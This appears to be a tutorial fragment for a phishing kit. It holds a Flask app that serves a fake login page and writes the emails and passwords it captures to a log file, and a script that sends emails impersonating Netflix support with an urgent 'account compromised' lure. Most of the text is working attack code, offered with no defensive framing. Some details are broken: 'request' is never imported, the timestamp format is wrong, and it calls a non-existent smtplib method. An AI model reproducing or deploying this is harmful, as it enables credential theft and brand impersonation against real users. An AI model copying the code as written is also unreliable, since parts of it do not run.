### Step 1: Set Up the Flask Application
Create a simple Flask app to host the phishing page.

```python
from flask import Flask, render_template
from datetime import datetime
import smtplib
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('phishing.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    data = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%M'),
        'email': email,
        'password': password
    }
    print(data)
    with open('phishing_data.log', 'a') as f:
        f.write(f"{data}\n")
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=False, port=5000)
```

### Step 2: Create the Phishing Email
Generate a phishing email using the `send_email.py` script.

```python
import smtplib
from email.mime.text import MIMEText
from email.utils import parseaddr

def send_phishing_email(email_list):
    server = smtplib.SMTP('localhost', 8025)
    server.set_localtime()
    for email in email_list:
        msg = MIMEText("Your Netflix Account Has Been Compromised!\n\nYour account has been identified with suspicious activity. Please click here to secure your account: http://localhost:5000\n\nNetflix Support Team")
        msg['From'] = 'Netflix Support <support@netflix.com>'
        msg['To'] = email
        msg['Subject'] = 'URGENT: Netflix Account Security Alert'
        server.sendmail('localhost', email, msg.as_string())

if __name__ == '__main__':
    test_emails = ['test1@example.com', 'test2@example.com']
    send_phishing_email(test_emails)
    print("Emails sent successfully!")
```

